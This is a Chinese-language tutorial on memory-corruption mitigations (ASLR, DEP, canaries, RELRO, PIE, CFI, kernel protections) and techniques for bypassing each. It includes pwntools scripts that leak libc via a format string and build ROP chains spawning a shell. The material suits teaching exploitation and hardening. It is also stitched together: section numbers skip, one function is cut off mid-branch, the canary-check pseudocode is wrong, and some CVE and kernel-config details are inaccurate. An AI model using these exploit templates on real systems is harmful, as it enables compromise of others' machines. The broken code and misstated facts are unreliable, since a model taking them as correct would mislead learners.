## 一、漏洞缓解机制概述

```
漏洞缓解机制演进:

  1990s: 无保护
    -> 栈溢出直接执行shellcode

  2000s: DEP/NX
    -> 禁止在数据段执行代码
    -> ret2libc/ROP绕过

  2001: Stack Canary
    -> 检测栈溢出
    -> 信息泄露绕过

  2005: ASLR
    -> 随机化地址空间
    -> 信息泄露绕过

  2010: RELRO
    -> 保护GOT表
    -> 部分RELRO仍可绕过

  2013: PIE
    -> 可执行文件位置随机化
    -> 信息泄露绕过

  2015+: CFI/CFG
    -> 控制流完整性
    -> COOP/数据导向攻击绕过

当前缓解机制栈:
  +--------------------------------------------------+
  |              应用层                               |
  |  +-------+ +-------+ +-------+ +-------+ +-----+ |
  |  | ASLR  | | DEP   | |Canary | |RELRO  | | PIE ||
  |  +-------+ +-------+ +-------+ +-------+ +-----+ |
  |  +-------------------------------------------+   |
  |  |              CFI / CFG                    |   |
  |  +-------------------------------------------+   |
  +--------------------------------------------------+
  |              内核层                               |
  |  +-------+ +-------+ +-------+ +-------+        |
  |  |KASLR  | |SMEP   | |SMAP   | |KPTI   |        |
  |  +-------+ +-------+ +-------+ +-------+        |
  +--------------------------------------------------+
```

## 二、ASLR地址空间布局随机化

### 2.1 ASLR原理

ASLR通过随机化进程地址空间中各模块的加载基址来防止攻击者预测关键地址。

```
无ASLR (固定地址):
  +------------------+
  | 0x08048000       |  <- ELF加载地址(固定)
  | .text (代码段)    |
  | 0x08049000       |  <- .plt
  | 0x0804a000       |  <- .got
  | ...              |
  | 0xbffff000       |  <- 栈(固定位置)
  +------------------+

有ASLR (随机地址):
  +------------------+
  | 0x56555000       |  <- ELF加载地址(每次不同)
  | .text (代码段)    |
  | 0x56556000       |  <- .plt
  | 0x56557000       |  <- .got
  | ...              |
  | 0x7ffd1234000    |  <- 栈(每次不同)
  +------------------+

随机化范围:
  - 栈基址: 随机偏移 0-0xFFFF (低12位固定)
  - 堆基址: 随机偏移
  - mmap基址: 随机偏移 (共享库加载位置)
  - 主可执行文件: 需要PIE才随机化
```

### 2.2 ASLR类型

| 类型 | 说明 | 随机化对象 |
|------|------|-----------|
| 用户态ASLR | 进程级地址随机化 | 栈/堆/mmap/PIE |
| KASLR | 内核地址随机化 | 内核代码/模块 |
| 独立库ASLR | 每个库独立随机化 | 共享库加载地址 |
| 全局ASLR | 整体地址空间随机化 | 所有段 |

### 2.3 绕过技术

**信息泄露绕过**

```
攻击链:
  1. 信息泄露漏洞 -> 泄露某个地址
  2. 计算基地址偏移
  3. 利用已知偏移找到目标地址
  4. 执行后续攻击

示例:
  泄露printf地址: 0x7f123456a000
  printf在libc中的偏移: 0x6a000
  libc基址 = 0x7f123456a000 - 0x6a000 = 0x7f1234500000
  system地址 = libc基址 + system偏移
```

**暴力破解绕过**

```
对于32位系统:
  ASLR随机化位数有限(约8-16位)
  可以通过暴力尝试绕过

  示例: fork服务器
  - 每次fork子进程地址空间相同
  - 可以多次尝试不同地址
  - 子进程崩溃不影响父进程

  32位Linux ASLR:
  - 栈: 19位随机化(8MB范围)
  - 暴力约524288次尝试
  - 在fork场景下可行

  64位系统暴力破解不可行
```

**非随机化模块绕过**

```
当程序加载了未编译为PIE的库时:
  - 非PIE库的地址固定
  - 可以利用固定地址的gadget

检查:
  # 查看进程映射
  cat /proc/<pid>/maps
  # 非PIE模块地址固定:
  # 00400000-00401000 r-xp 00000000 fd:00 1234 /path/to/nonpie_binary
```

**部分覆盖绕过**

```
当只能覆盖返回地址的低位时:
  原返回地址: 0x08048456
  覆盖低位为: 0x08048XYZ
  只修改最后1-2字节
  在同一模块内跳转

  适用场景:
  - 有限长度溢出(只能覆盖1-2字节)
  - 同一模块内跳转
```

## 三、DEP/NX数据执行防护

### 3.1 DEP原理

DEP (Data Execution Prevention) / NX (No-eXecute) 利用CPU的NX位标记内存页是否可执行。

```
内存页权限:
  可读(R) + 可写(W) + 可执行(X)

  正常段权限:
  .text:  R + X (代码段可执行)
  .data:  R + W (数据段可写不可执行)
  .bss:   R + W
  栈:     R + W (DEP关闭时可能 R+W+X)
  堆:     R + W

DEP开启后:
  栈: R + W (不可执行!)
  堆: R + W (不可执行!)

  尝试在栈上执行代码 -> CPU异常(SIGSEGV)
```

**DEP工作模式**

```
Windows DEP模式:
  OptIn (默认): 仅保护Windows组件和指定进程
  OptOut: 保护所有进程(白名单除外)
  AlwaysOn: 强制保护所有进程
  AlwaysOff: 关闭DEP

Linux NX:
  通过PaX或内核CONFIG_ARCH_MMAP_RND_BITS实现
  默认在支持NX的CPU上启用
```

### 3.2 绕过技术

**ret2libc (return-to-libc)**

```
原理: 不执行shellcode，而是跳转到已存在的可执行代码

传统shellcode:
  栈上放置shellcode -> 跳转到栈地址执行

ret2libc:
  覆盖返回地址为system()函数地址
  栈上构造system("/bin/sh")的参数

  栈布局:
  [填充数据]
  [system地址]     <- 覆盖的返回地址
  [返回地址(可选)]
  ["/bin/sh"地址]  <- system的参数
```

**Return-Oriented Programming (ROP)**

```
ROP原理:
  在可执行代码中寻找以ret结尾的小代码片段(gadget)
  通过连续跳转到不同gadget实现任意功能

  gadget示例:
  0x08048453: pop eax ; ret
  0x08048454: pop ebx ; ret
  0x08048455: mov [eax], ebx ; ret

  ROP链:
  [gadget1地址]  -> pop eax; ret
  [0xbss_addr]   -> eax = bss段地址
  [gadget2地址]  -> pop ebx; ret
  [shellcode]    -> ebx = shellcode内容
  [gadget3地址]  -> mov [eax], ebx; ret (写入shellcode到bss)
  [bss_addr]     -> 跳转到bss执行shellcode

  工具:
  - ROPgadget: 自动搜索gadget
  - Ropper: 另一个gadget搜索工具
  - Pwntools: 自动构造ROP链
```

```bash
# 搜索gadget
ROPgadget --binary ./target
ROPgadget --binary ./target --only "pop|ret"
ROPgadget --binary ./target --depth 10

# 使用pwntools构造ROP
from pwn import *
elf = ELF('./target')
rop = ROP(elf)
rop.call('system', ['/bin/sh'])
print(rop.dump())
```

**ret2syscall**

```
通过ROP调用系统调用:
  eax = 11 (execve系统调用号)
  ebx = "/bin/sh"地址
  ecx = 0
  edx = 0
  int 0x80

  ROP链:
  pop eax; ret      -> eax = 11
  pop ebx; ret       -> ebx = "/bin/sh"地址
  pop ecx; ret       -> ecx = 0
  pop edx; ret       -> edx = 0
  int 0x80
```

**ret2csu (x64)**

```
x64下利用__libc_csu_init函数中的gadget:
  控制rdi/rsi/rdx寄存器(函数参数)
  实现任意函数调用

  __libc_csu_init中的gadget:
  0x_csu1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
  0x_csu2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
```

## 四、Stack Canary栈保护

### 4.1 Canary原理

```
Stack Canary (栈金丝雀值) 工作原理:

函数调用时在栈上放置随机值:
  +------------------+
  | 局部变量         |
  | ...              |
  | [CANARY]         |  <- 随机值(函数prologue插入)
  | 保存的EBP        |
  | 返回地址         |
  +------------------+

函数返回前检查Canary:
  if (canary != __stack_chk_fail) {
      __stack_chk_fail();  // 触发终止
  }

  攻击者溢出时:
  [AAAAAAA][覆盖Canary][覆盖EBP][覆盖返回地址]
  如果Canary不匹配 -> 程序终止
```

**Canary类型**

| 类型 | 特征 | 线程局部存储 |
|------|------|-------------|
| Terminator Canary | 包含\x00(终止符) | 否 |
| Random Canary | 随机值 | 否 |
| Random XOR Canary | 随机值异或 | 是 |
| Master Canary | TLS存储 | 是 |

```
Linux Canary实现:
  - 存储在TLS (Thread Local Storage)中
  - 每个线程独立
  - 进程启动时从/dev/urandom随机生成
  - 函数prologue: mov rax, [fs:0x28]; mov [rbp-8], rax
  - 函数epilogue: mov rax, [rbp-8]; xor rax, [fs:0x28]; je ok; call __stack_chk_fail

Windows Canary:
  - 类似机制 /GS编译选项
  - 存储在__security_cookie
```

### 4.2 绕过技术

**信息泄露绕过**

```
攻击链:
  1. 信息泄露漏洞 -> 读取栈上的Canary值
  2. 溢出时保持Canary不变
  3. 覆盖返回地址

  常见泄露场景:
  - 格式化字符串漏洞泄露栈数据
  - 越界读漏洞读取Canary
  - 时间侧信道

格式化字符串泄露:
  printf(input);  // 用户控制格式化字符串
  输入: %p.%p.%p.%p.%p
  读取栈上数据，Canary在第6-7个参数位置

  payload: "%6$p"
  输出Canary值: 0x12345678abcdef00

  然后在溢出时:
  [填充][Canary值][EBP][返回地址]
```

**逐字节爆破绕过**

```
当程序有fork()时:
  - 子进程继承父进程的Canary
  - 可以逐字节暴力破解

  原理:
  - Canary最低字节通常是\x00(终止符)
  - 逐个字节尝试(每字节最多256次)
  - 如果程序不崩溃 -> 字节正确
  - 继续下一个字节

  总尝试次数: 256 * 7 = 1792次
  (第一字节已知为\x00)

  适用场景:
  - fork服务器
  - 程序不重启Canary
```

**覆盖TLS绕过**

```
如果可以写入TLS区域:
  - 修改TLS中的Canary值
  - 同时修改栈上Canary
  - 绕过检查

  需要任意写漏洞
  需要知道TLS地址
```

## 五、RELRO只读重定位

### 5.1 RELRO原理

RELRO (RELocation Read-Only) 保护GOT (Global Offset Table) 表不被篡改。

```
无RELRO:
  GOT表可写
  攻击者可以覆盖GOT条目
  实现函数劫持

  示例:
  覆盖printf@GOT为system地址
  下次调用printf时实际调用system

部分RELRO (Partial RELRO):
  .got段只读(包含不可变重定位)
  .got.plt仍可写(延迟绑定需要)
  攻击者仍可覆盖.got.plt

完全RELRO (Full RELRO):
  所有GOT表只读
  延迟绑定被禁用(启动时全部绑定)
  GOT覆盖攻击不可行
```

```bash
# 检查RELRO状态
readelf -l ./binary | grep -i gnu_relro
# 有GNU_RELRO段 = 至少Partial RELRO

# 检查是否Full RELRO
readelf -d ./binary | grep -i bind_now
# 有BIND_NOW = Full RELRO

# 使用checksec
checksec --file=./binary
# 输出: RELRO: Full RELRO / Partial RELRO / No RELRO
```

### 5.2 绕过技术

**Partial RELRO绕过**

```
虽然.got被保护，但.got.plt仍可写:
  覆盖.got.plt中的函数地址

  攻击:
  覆盖printf@got.plt -> system
  printf("/bin/sh") 变成 system("/bin/sh")
```

**Full RELRO绕过**

```
Full RELRO下GOT不可写，但可以:
  1. 覆盖其他函数指针
     - .fini_array (析构函数数组)
     - __malloc_hook / __free_hook (已废弃)
     - atexit处理函数

  2. 覆盖栈上的函数指针
     - 虚函数表(vtable)
     - 回调函数指针

  3. 数据导向攻击
     - 不修改控制流
     - 直接修改关键数据
```

## 六、PIE位置无关可执行文件

### 6.1 PIE原理

```
无PIE:
  程序加载到固定地址
  代码段地址固定
  可以使用固定地址的gadget

  $ readelf -h ./binary
  Entry point address: 0x400000  (固定)

有PIE:
  程序加载到随机地址
  需要信息泄露才能确定基址
  增加攻击难度

  $ readelf -h ./binary_pie
  Entry point address: 0x1060  (偏移，实际地址随机)
```

### 6.2 绕过技术

```
PIE绕过需要信息泄露:

  1. 泄露代码段地址
     - 格式化字符串泄露栈上保存的返回地址
     - 返回地址指向代码段
     - 计算基址

  2. 泄露代码指针
     - 已初始化的函数指针
     - 虚函数表地址
     - 计算基址

  3. Partial overwrite
     - 只覆盖地址低位
     - 在同一模块内跳转
     - 不需要知道完整基址

  示例:
  泄露返回地址: 0x55a1b2c3d456
  PIE基址 = 0x55a1b2c3d000 (对齐到页)
  目标函数 = 基址 + offset
```

## 七、CFI控制流完整性

### 7.1 CFI原理

CFI (Control Flow Integrity) 确保程序的控制流遵循预定义的图。

```
正常控制流:
  call functionA -> 合法目标
  call functionB -> 合法目标

无CFI时攻击:
  覆盖返回地址/函数指针 -> 任意地址
  执行非预期代码

CFI检查:
  间接调用前检查目标是否在合法集合中
  if (target not in allowed_targets):
      abort()

  检查点:
  - 间接调用 (call [rax])
  - 间接跳转 (jmp [rax])
  - 返回地址 (ret)
  - 函数指针
  - 虚函数表
```

### 7.2 CFG原理

CFG (Control Flow Guard) 是微软Windows实现的CFI。

```
CFG工作流程:
  1. 编译时分析所有间接调用目标
  2. 生成合法目标位图(bitmap)
  3. 间接调用前插入检查:
     __guard_check_icall(&target)
     if (bitmap[target/8] & (1 << (target%8))):
         call target  // 合法
     else:
         __guard_dispatch_icall()  // 非法，终止

  编译选项:
  cl /guard:cf source.c    # 启用CFG
  gcc -fcf-protection      # GCC的CFI
```

### 7.3 绕过技术

**数据导向攻击 (Data-Oriented Attacks)**

```
不修改控制流，直接修改数据:

  1. 修改关键变量
     - 身份验证标志: is_admin = true
     - 权限标志: privilege_level = 0
     - 配置值: debug_mode = true

  2. 修改函数参数
     - 修改传给敏感函数的参数
     - 不需要劫持控制流

  示例:
  溢出修改isAuthenticated变量
  if (isAuthenticated) -> true
  绕过认证
```

**COOP (Counterfeit Object-Oriented Programming)**

```
利用C++虚函数表:

  1. 伪造虚函数表
  2. 虚函数调用使用伪造的表
  3. 调用任意合法函数

  虽然CFI保护了直接跳转
  但虚函数调用是通过虚表间接的
  伪造虚表可以在合法函数间跳转
```

**合法目标滥用**

```
CFI只检查目标是否合法:
  - 合法目标集可能包含攻击可用的函数
  - 如果目标函数本身就是危险的(如system)
  - CFG不会阻止合法调用

  攻击:
  利用漏洞使程序调用system()
  system是合法目标 -> CFG通过
```

**JOP (Jump-Oriented Programming)**

```
使用间接跳转替代ret:
  使用合法的跳转gadget
  构造JOP链
  绕过ret检查

  gadget类型:
  jmp [rax]  -> 跳转到rax指向的地址
  jmp [rbx]  -> 跳转到rbx指向的地址
```

## 八、缓解机制组合分析

```
checksec输出解读:

$ checksec --file=./binary
RELRO:    Full RELRO        <- GOT表保护
Stack:    Canary found       <- 栈溢出保护
NX:       NX enabled         <- 数据执行保护
PIE:      PIE enabled        <- 地址随机化

各机制的交互作用:

场景1: 栈溢出 + 无所有保护
  -> 简单覆盖返回地址 + 跳转到shellcode
  -> 难度: 低

场景2: 栈溢出 + DEP
  -> 不能跳到栈上shellcode
  -> 使用ret2libc或ROP
  -> 难度: 中

场景3: 栈溢出 + DEP + ASLR
  -> 需要信息泄露地址
  -> 或使用非随机化模块
  -> 难度: 中高

场景4: 栈溢出 + DEP + ASLR + Canary
  -> 需要泄露Canary
  -> 需要泄露地址
  -> 需要ROP
  -> 难度: 高

场景5: 栈溢出 + 全部保护(含CFI)
  -> 需要泄露多个值
  -> 需要绕过CFI
  -> 数据导向攻击
  -> 难度: 极高

当前攻击者能力:
  - 信息泄露是关键第一步
  - 一旦泄露足够信息，大多数机制可被绕过
  - CFI是当前最难绕过的机制
  - 内核缓解(SMEP/SMAP/KPTI)进一步增加难度
```

```
缓解机制的分层防御:

应用层:
  | - ASLR: 地址不可预测
  | - PIE: 代码地址随机
  | - DEP: 不可在数据区执行
  | - Canary: 栈溢出检测
  | - RELRO: GOT表保护
  | - CFI: 控制流合法

内核层:
  | - KASLR: 内核地址随机
  | - SMEP: 管理模式下不可执行用户代码
  | - SMAP: 管理模式下不可访问用户数据
  | - KPTI: 内核页表隔离
  | - KCFI: 内核控制流完整性
```

### 9.3 一键安全检测脚本

```python
#!/usr/bin/env python3
"""二进制安全保护机制检测脚本"""
import subprocess
import re
import struct
import os

class BinarySecurityChecker:
    def __init__(self, binary_path):
        self.path = binary_path
        self.results = {}

    def check_all(self):
        self.check_relro()
        self.check_canary()
        self.check_nx()
        self.check_pie()
        self.check_fortify()
        self.check_arch()
        self.check_stripped()
        return self.results

    def _run_cmd(self, cmd):
        try:
            return subprocess.check_output(
                cmd, stderr=subprocess.STDOUT, shell=True
            ).decode('utf-8', errors='ignore')
        except:
            return ''

    def check_relro(self):
        output = self._run_cmd(f'readelf -l "{self.path}"')
        has_relro = 'GNU_RELRO' in output
        bind_now = 'BIND_NOW' in self._run_cmd(f'readelf -d "{self.path}"')

        if has_relro and bind_now:
            self.results['RELRO'] = 'Full RELRO'
        elif has_relro:
            self.results['RELRO'] = 'Partial RELRO'
        else:
            self.results['RELRO'] = 'No RELRO'

    def check_canary(self):
        output = self._run_cmd(f'readelf -s "{self.path}"')
        has_canary = '__stack_chk_fail' in output
        self.results['Canary'] = 'Canary found' if has_canary else 'No Canary'

    def check_nx(self):
        output = self._run_cmd(f'readelf -l "{self.path}"')
        for line in output.split('\n'):
            if 'GNU_STACK' in line:
                if 'RWE' in line:
                    self.results['NX'] = 'NX disabled'
                else:
                    self.results['NX'] = 'NX enabled'
                return
        self.results['NX'] = 'Unknown'

    def check_pie(self):
        output = self._run_cmd(f'readelf -h "{self.path}"')
        for line in output.split('\n'):
            if 'Type:' in line:
                ftype = line.split(':')[1].strip()
                if 'DYN' in ftype:
                    self.results['PIE'] = 'PIE enabled'
                elif 'EXEC' in ftype:
                    self.results['PIE'] = 'No PIE'
                else:
                    self.results['PIE'] = f'Unknown ({ftype})'
                return
        self.results['PIE'] = 'Unknown'

    def check_fortify(self):
        output = self._run_cmd(f'readelf -s "{self.path}"')
        has_fortify = '_chk' in output
        self.results['FORTIFY'] = 'Yes' if has_fortify else 'No'

    def check_arch(self):
        output = self._run_cmd(f'readelf -h "{self.path}"')
        for line in output.split('\n'):
            if 'Machine:' in line:
                self.results['Arch'] = line.split(':')[1].strip()
                return
        self.results['Arch'] = 'Unknown'

    def check_stripped(self):
        output = self._run_cmd(f'readelf -h "{self.path}"')
        has_symbols = '.symtab' in self._run_cmd(f'readelf -S "{self.path}"')
        self.results['Stripped'] = 'No' if has_symbols else 'Yes'

    def security_score(self):
        """计算安全评分(0-100)"""
        score = 0
        if 'Full' in self.results.get('RELRO', ''):
            score += 20
        elif 'Partial' in self.results.get('RELRO', ''):
            score += 10
        if 'found' in self.results.get('Canary', ''):
            score += 20
        if 'enabled' in self.results.get('NX', ''):
            score += 20
        if 'enabled' in self.results.get('PIE', ''):
            score += 20
        if 'Yes' in self.results.get('FORTIFY', ''):
            score += 10
        if self.results.get('Stripped') == 'Yes':
            score += 10
        return score

    def report(self):
        self.check_all()
        score = self.security_score()
        report = f"\n{'='*50}\n"
        report += f"二进制安全检测报告: {self.path}\n"
        report += f"{'='*50}\n"
        for key, value in self.results.items():
            report += f"  {key:12s}: {value}\n"
        report += f"{'='*50}\n"
        report += f"  安全评分: {score}/100\n"
        if score >= 80:
            report += "  评级: A (优秀)\n"
        elif score >= 60:
            report += "  评级: B (良好)\n"
        elif score >= 40:
            report += "  评级: C (一般)\n"
        elif score >= 20:
            report += "  评级: D (较差)\n"
        else:
            report += "  评级: F (危险)\n"
        return report

# 使用示例
checker = BinarySecurityChecker('./target_binary')
print(checker.report())
```

```python
from pwn import *

def aslr_bypass_fmtstr():
    """通过格式化字符串漏洞绕过ASLR"""
    # 目标程序存在格式化字符串漏洞:
    # printf(user_input);

    p = process('./vulnerable')
    elf = ELF('./vulnerable')

    # 第一步: 泄露栈上的libc地址
    # 格式化字符串可以读取栈上的值
    # __libc_start_main的返回地址通常在栈上

    # 泄露多个栈值
    payload = b'%p.' * 20
    p.sendline(payload)
    leak = p.recvline()

    # 解析泄露的地址
    addrs = []
    for part in leak.split(b'.'):
        try:
            addr = int(part, 16)
            addrs.append(addr)
        except:
            continue

    # 找到__libc_start_main的返回地址(通常在第7-15个参数位置)
    libc_base = None
    for addr in addrs:
        # 检查是否是libc地址范围(0x7f开头)
        if (addr >> 40) == 0x7f:
            # 计算libc基址
            # __libc_start_main的偏移减去返回地址偏移
            libc_start_offset = elf.symbols.get('__libc_start_main', 0)
            if libc_start_offset:
                libc_base = addr - libc_start_offset - 240  # 240是call后的偏移
                break

    if libc_base:
        log.success(f'libc基址: {hex(libc_base)}')

        # 计算system和/bin/sh的地址
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        system_addr = libc_base + libc.symbols['system']
        binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

        log.success(f'system: {hex(system_addr)}')
        log.success(f'/bin/sh: {hex(binsh_addr)}')

        # 现在可以构造ROP链
        return libc_base, system_addr, binsh_addr
    else:
```

```python
from pwn import *

def dep_bypass_rop():
    """完整的ROP链绕过DEP"""
    context.arch = 'amd64'

    p = process('./vulnerable')
    elf = ELF('./vulnerable')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    # 假设已知:
    # 1. 栈溢出漏洞(缓冲区大小256字节)
    # 2. 已泄露libc基址
    # 3. Canary已泄露

    libc_base = 0x7ffff7a0d000  # 从信息泄露获得
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
    pop_rdi_ret = libc_base + 0x215bf  # pop rdi; ret gadget

    # 构造payload
    buffer_size = 256
    canary = 0x1234567890abcdef  # 从泄露获得

    payload = b'A' * buffer_size
    payload += p64(canary)           # 覆盖canary(保持原值)
    payload += b'B' * 8             # 覆盖saved rbp
    payload += p64(pop_rdi_ret)     # ROP: pop rdi; ret
    payload += p64(binsh_addr)       # rdi = "/bin/sh"
    payload += p64(system_addr)      # call system("/bin/sh")

    # 如果需要栈对齐(x86_64要求16字节对齐)
    # 在调用system前加一个ret
    ret_gadget = libc_base + 0x215c0  # ret gadget
    payload = b'A' * buffer_size
    payload += p64(canary)
    payload += b'B' * 8
    payload += p64(ret_gadget)       # 栈对齐
    payload += p64(pop_rdi_ret)
    payload += p64(binsh_addr)
    payload += p64(system_addr)

    p.sendline(payload)
    p.interactive()

def dep_bypass_ropchain_syscall():
    """使用syscall构造execve ROP链"""
    context.arch = 'amd64'

    # execve("/bin/sh", NULL, NULL)
    # rax = 59 (execve syscall number)
    # rdi = pointer to "/bin/sh"
    # rsi = NULL
    # rdx = NULL

    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc_base = 0x7ffff7a0d000

    # 需要的gadgets:
    # pop rax; ret       -> 设置rax = 59
    # pop rdi; ret       -> 设置rdi = "/bin/sh"
    # pop rsi; ret       -> 设置rsi = 0
    # pop rdx; ret       -> 设置rdx = 0
    # syscall; ret       -> 触发系统调用

    # 使用ROPgadget搜索
    # ROPgadget --binary libc.so.6 --only "pop|ret"

    pop_rax = libc_base + 0x439c8  # pop rax; ret
    pop_rdi = libc_base + 0x215bf  # pop rdi; ret
    pop_rsi = libc_base + 0x215c0  # pop rsi; pop r15; ret
    pop_rdx = libc_base + 0x1b96   # pop rdx; ret
    syscall = libc_base + 0x11012  # syscall; ret
    binsh = libc_base + next(libc.search(b'/bin/sh'))

    rop_chain = b''
    rop_chain += p64(pop_rax) + p64(59)        # rax = 59
    rop_chain += p64(pop_rdi) + p64(binsh)     # rdi = "/bin/sh"
    rop_chain += p64(pop_rsi) + p64(0) + p64(0)  # rsi = 0 (额外pop r15)
    rop_chain += p64(pop_rdx) + p64(0)        # rdx = 0
    rop_chain += p64(syscall)                  # syscall

    return rop_chain
```

### 11.2 历史CVE案例

```
缓解机制绕过的历史CVE案例:

1. CVE-2014-0160 (Heartbleed)
   - 漏洞: OpenSSL越界读
   - 绕过机制: 信息泄露 -> 绕过ASLR
   - 影响: 泄露内存中的密钥、cookie、Canary
   - 利用链: Heartbleed泄露 -> ASLR绕过 -> ROP

2. CVE-2014-6271 (Shellshock)
   - 漏洞: Bash环境变量注入
   - 绕过机制: 不需要绕过内存保护(逻辑漏洞)
   - 影响: 直接RCE
   - 启示: 不是所有攻击都需要绕过内存保护

3. CVE-2015-0235 (Ghost)
   - 漏洞: glibc getaddrinfo栈溢出
   - 绕过机制: ASLR + DEP + Canary
   - 利用: 需要信息泄露 + ROP
   - 难度: 高(但在DHCP场景可远程触发)

4. CVE-2016-5195 (Dirty COW)
   - 漏洞: Linux内核竞态条件
   - 绕过机制: 绕过所有用户态保护
   - 影响: 只读文件可写
   - 利用: 修改setuid程序 -> 提权

5. CVE-2017-0199 (Office RCE)
   - 漏洞: OLE对象处理
   - 绕过机制: 不涉及内存保护(逻辑漏洞)
   - 利用: 通过恶意文档直接执行代码

6. CVE-2018-17182 (Linux KASLR)
   - 漏洞: 内核信息泄露
   - 绕过机制: KASLR绕过
   - 利用: 泄露内核地址 -> 内核ROP

7. CVE-2019-2215 (bad binder)
   - 漏洞: Android Binder UAF
   - 绕过机制: 绕过SELinux + ASLR
   - 利用: UAF -> 任意读写 -> 提权

8. CVE-2020-8835 (Linux eBPF)
   - 漏洞: eBPF验证器绕过
   - 绕过机制: SMEP/SMAP/KASLR
   - 利用: 验证器绕过 -> 内核读写 -> 提权
```

### 11.3 内核层缓解机制

```
内核层缓解机制(与用户态配合):

| 机制 | 保护对象 | 绕过方法 | 难度 |
|------|----------|----------|------|
| KASLR | 内核地址 | 内核信息泄露 | 高 |
| SMEP | 内核执行用户代码 | ROP/JOP | 高 |
| SMAP | 内核访问用户数据 | copy_to_user利用 | 高 |
| KPTI | 内核页表隔离 | 侧信道/Meltdown | 极高 |
| KCFI | 内核控制流 | 数据导向 | 极高 |
| STACKPROTECTOR | 内核栈溢出 | 内核信息泄露 | 高 |
| HARDENED_USERCOPY | copy_to/from_user | 合法路径利用 | 高 |
| RANDOMIZE_BASE | 内核模块地址 | 模块泄露 | 高 |

KASLR绕过示例(CVE-2018-17182):
  1. 触发内核信息泄露(如dmesg泄露)
  2. 泄露内核函数地址
  3. 计算内核基址
  4. 构造内核ROP链
  5. 提权到root

SMEP绕过:
  1. 使用内核ROP代替用户态shellcode
  2. 利用native_write_cr4关闭SMEP位
  3. 然后在用户态执行代码
  4. 需要知道内核ROP gadget地址

SMAP绕过:
  1. 使用copy_from_user/copy_to_user
  2. 利用内核中已有的数据拷贝原语
  3. 不直接访问用户态内存
  4. 通过合法内核函数间接操作

KPTI绕过:
  1. 利用侧信道(Meltdown/Spectre)
  2. 通过缓存时序泄露内核数据
  3. 不需要直接访问内核内存
  4. 但速度慢且不稳定
```

## 十二、实战exploit开发流程

```
完整exploit开发流程:

Phase 1: 信息收集
  ├── 运行checksec获取保护信息
  ├── 确定漏洞类型(栈溢出/格式化字符串/UAF等)
  ├── 确定漏洞可控数据大小
  └── 分析漏洞触发路径

Phase 2: 地址泄露
  ├── 利用格式化字符串泄露
  │   ├── 泄露libc地址
  │   ├── 泄露Canary
  │   └── 泄露栈/代码段地址
  ├── 利用越界读泄露
  └── 利用信息泄露绕过ASLR/PIE/Canary

Phase 3: ROP链构造
  ├── 确定可用gadget
  │   ├── ROPgadget搜索
  │   ├── ropper搜索
  │   └── one_gadget搜索
  ├── 构造ROP链
  │   ├── ret2libc (system("/bin/sh"))
  │   ├── ret2syscall (execve)
  │   └── ret2csu (x64控制参数)
  └── 栈对齐处理

Phase 4: Payload组装
  ├── 填充数据到溢出偏移
  ├── 写入泄露的Canary
  ├── 覆盖saved RBP
  ├── 写入ROP链
  └── 处理编码/转义

Phase 5: 测试与调试
  ├── 本地测试
  ├── GDB调试
  ├── 处理边界情况
  └── 远程适配
```
